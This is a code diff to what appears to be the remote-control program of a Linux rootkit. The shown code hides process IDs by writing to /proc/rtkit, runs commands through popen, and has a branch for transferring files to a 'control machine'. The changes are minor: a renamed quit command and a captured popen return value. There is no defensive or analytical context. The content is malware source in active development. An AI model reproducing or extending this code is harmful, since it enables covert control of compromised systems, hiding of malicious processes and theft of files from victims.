@@ -65,7 +65,6 @@ void initRemote() {
     popen(command, "r");
     // popen("chmod 755 *", "r");
     // popen("sh ./init.sh", "r");
-
 }
 
 int main(int argc, char const *argv[]) {
@@ -129,7 +128,7 @@ int main(int argc, char const *argv[]) {
             run = 1;
         }
         // Quit the remote
-        else if (strcmp(command, "sendquit\n") == 0) {
+        else if (strcmp(command, "squit\n") == 0) {
             bzero(command, sizeof(command));
             break;
         }
@@ -140,7 +139,7 @@ int main(int argc, char const *argv[]) {
             sprintf(command, "echo -n hp%s > /proc/rtkit", hidepid);
             printf("%s\n", command);
             bzero(hidepid, sizeof(hidepid));
-            popen(command, "r");
+            fp = popen(command, "r");
         }
         // Transfer file to the control machine
         else if (strcmp(command, "tran") == 0) {
